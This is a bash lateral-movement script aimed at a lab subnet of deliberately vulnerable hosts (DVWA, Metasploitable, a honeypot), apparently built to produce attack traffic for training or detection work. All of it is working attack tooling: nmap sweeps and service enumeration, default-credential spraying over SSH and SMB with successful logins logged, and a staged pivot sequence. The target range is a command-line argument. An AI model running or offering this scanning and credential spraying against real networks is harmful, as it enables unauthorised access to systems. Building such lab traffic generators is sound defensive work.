#!/bin/bash
###############################################################################
# Lateral Movement Script
# Sequential host scanning, credential reuse, pivot simulation
###############################################################################

SUBTYPE="${1:-full}"
TARGET="${2:-10.10.40.0/24}"
TARGET_PORT="${3:-*}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"
source "${SCRIPT_DIR}/configs/targets.conf" 2>/dev/null || true

mkdir -p "$RESULTS_DIR"

echo "[*] Lateral movement: $SUBTYPE across ${TARGET}"

# All known targets
TARGETS=("${DVWA_IP:-10.10.40.10}" "${METASPLOIT_IP:-10.10.40.20}"
         "${WINDOWS_IP:-10.10.40.21}" "${WORDPRESS_IP:-10.10.40.30}" "${CRAPI_IP:-10.10.40.31}"
         "${SERVICES_FTP_IP:-10.10.40.32}" "${SERVICES_SMTP_IP:-10.10.40.42}"
         "${SERVICES_SNMP_IP:-10.10.40.43}" "${HONEYPOT_IP:-10.10.40.33}")

run_scan() {
    echo "[*] Sequential multi-host scanning (lateral discovery)"

    # Phase 1: Ping sweep
    echo "[*] Phase 1: Ping sweep..."
    nmap -sn "$TARGET" -oN "${RESULTS_DIR}/lateral_ping_sweep.txt" 2>&1 || true
    sleep 3

    # Phase 2: Quick port scan each discovered host
    echo "[*] Phase 2: Sequential port scans..."
    for ip in "${TARGETS[@]}"; do
        echo "[*] Scanning: $ip"
        nmap -sS -T4 --top-ports 50 "$ip" \
            -oN "${RESULTS_DIR}/lateral_scan_${ip//./_}.txt" 2>&1 || true
        # Pause between hosts (realistic lateral movement pattern)
        sleep $((RANDOM % 10 + 5))
    done

    # Phase 3: Service enumeration on interesting hosts
    echo "[*] Phase 3: Service enumeration..."
    for ip in "${TARGETS[@]}"; do
        nmap -sV --top-ports 20 "$ip" \
            -oN "${RESULTS_DIR}/lateral_services_${ip//./_}.txt" 2>&1 || true
        sleep $((RANDOM % 5 + 3))
    done

    echo "[+] Sequential scanning complete"
}

run_cred_reuse() {
    echo "[*] Credential reuse across multiple hosts"

    # Common credentials to try on every host
    local creds=("admin:password" "admin:admin" "root:root" "root:toor"
                 "msfadmin:msfadmin" "vagrant:vagrant" "test:test")

    # Try SSH on all hosts
    echo "[*] SSH credential reuse..."
    for ip in "${TARGETS[@]}"; do
        for cred in "${creds[@]}"; do
            user="${cred%%:*}"
            pass="${cred#*:}"
            sshpass -p "$pass" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
                -o BatchMode=yes "${user}@${ip}" exit 2>/dev/null
            if [[ $? -eq 0 ]]; then
                echo "[+] SSH SUCCESS: ${user}:${pass} @ ${ip}" | tee -a "${RESULTS_DIR}/lateral_creds_found.txt"
            fi
            sleep 1
        done
        sleep 3
    done

    # Try SMB on Windows/Metasploitable
    echo "[*] SMB credential reuse..."
    local smb_targets=("${METASPLOIT_IP:-10.10.40.20}" "${WINDOWS_IP:-10.10.40.21}")
    for ip in "${smb_targets[@]}"; do
        for cred in "${creds[@]}"; do
            user="${cred%%:*}"
            pass="${cred#*:}"
            smbclient -L "//${ip}" -U "${user}%${pass}" -c "exit" 2>/dev/null && \
                echo "[+] SMB SUCCESS: ${user}:${pass} @ ${ip}" \
                    | tee -a "${RESULTS_DIR}/lateral_creds_found.txt"
            sleep 1
        done
    done

    echo "[+] Credential reuse complete"
}

run_pivot() {
    echo "[*] Pivot simulation (multi-hop attack pattern)"

    # Simulate: Compromise host A -> scan from A -> move to host B

    # Step 1: Initial compromise (recon on first target)
    local pivot_start="${DVWA_IP:-10.10.40.10}"
    echo "[*] Step 1: Initial target recon: ${pivot_start}"
    nmap -sT -T3 --top-ports 20 "$pivot_start" \
        -oN "${RESULTS_DIR}/pivot_step1_recon.txt" 2>&1 || true
    sleep 5

    # Step 2: Discover adjacent hosts
    echo "[*] Step 2: Adjacent host discovery..."
    nmap -sn "10.10.40.0/24" -oN "${RESULTS_DIR}/pivot_step2_discovery.txt" 2>&1 || true
    sleep 5

    # Step 3: Scan second target (deeper recon)
    local pivot_next="${METASPLOIT_IP:-10.10.40.20}"
    echo "[*] Step 3: Scanning pivot target: ${pivot_next}"
    nmap -sV -T3 --top-ports 50 "$pivot_next" \
        -oN "${RESULTS_DIR}/pivot_step3_scan.txt" 2>&1 || true
    sleep 5

    # Step 4: Service-specific probes on second target
    echo "[*] Step 4: Service probing..."
    for port in 22 21 80 445 3306 5432; do
        echo "[*] Probing ${pivot_next}:${port}"
        nmap -sV -p "$port" --script=default "$pivot_next" 2>&1 | head -10 || true
        sleep 2
    done

    # Step 5: Move to third target
    local pivot_third="${WINDOWS_IP:-10.10.40.21}"
    echo "[*] Step 5: Lateral move to: ${pivot_third}"
    nmap -sV -T3 --top-ports 30 "$pivot_third" \
        -oN "${RESULTS_DIR}/pivot_step5_third.txt" 2>&1 || true
    sleep 5

    # Step 6: Final target — data staging simulation
    echo "[*] Step 6: Data staging simulation..."
    for ip in "${TARGETS[@]}"; do
        curl -sk "http://${ip}/" -o /dev/null 2>&1 || true
        curl -sk "http://${ip}:8080/" -o /dev/null 2>&1 || true
        sleep 1
    done

    echo "[+] Pivot simulation complete"
}

case "$SUBTYPE" in
    scan)       run_scan ;;
    cred_reuse) run_cred_reuse ;;
    pivot)      run_pivot ;;
    full)
        run_scan
        sleep 10
        run_cred_reuse
        sleep 10
        run_pivot
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: scan, cred_reuse, pivot, full"
        exit 1
        ;;
esac

echo "[*] Lateral movement script complete"
